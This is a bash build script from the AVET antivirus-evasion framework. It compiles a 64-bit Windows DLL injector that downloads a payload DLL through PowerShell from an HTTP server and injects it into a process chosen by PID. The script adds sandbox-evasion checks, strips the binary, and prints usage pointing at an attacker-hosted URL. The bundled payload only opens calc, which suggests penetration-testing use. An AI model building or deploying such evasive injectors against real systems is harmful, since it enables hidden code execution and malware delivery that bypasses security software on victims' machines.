#!/bin/bash


#DESCRIPTION_START
# Dll injection 64-bit example build script
# Creates an executable that injects a dll residing on the target's disk into a target process
# Also creates an exec_calc 64-bit dll payload , and downloads the file via powershell onto the target's disk for injection
# Target process and dll can be specified in the third(!) command line argument as format:		pid,dll_path

# The download mechanism, as deployed here, is kind of a workaround to deliver the payload to the target.
# download_powershell is "abused" as payload source, so the file is downloaded and read into memory, but that buffer is not used to deliver the dll.
# Instead, the dll is read from disk (again) by the inject_dll payload execution method, and injected into the target process specified in payload_info.
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# compile exec_calc 64-bit dll payload from source
# the idea was to generate a meterpreter dll payload here via msfvenom, but somehow the meterpreter dll appears to be non-injectible
$win64_compiler test_payloads/exec_calc.c -shared -o output/exec_calc64.dll

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'
reset_evasion_technique_counter

# payload will be downloaded from HTTP source via powershell
set_payload_source download_powershell

# no encoding, no key
# encoding/decoding would make no sense here, as the payload itself is not touched or read in by the executable after download
set_key_source no_data
set_decoder none

# retrieve payload info (target pid, dll path) from command line on execution
set_payload_info_source from_command_line_raw

# set payload execution method
set_payload_execution_method inject_dll

# compile 
$win64_compiler -o output/injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe source/avet.c -lws2_32
strip output/injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe

# cleanup
cleanup_techniques

echo "
# Host the generated dll payload via HTTP on port 80
# Call the injector executable like:
# $ injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
# 'random' just fills argv[2], which is not needed here
"
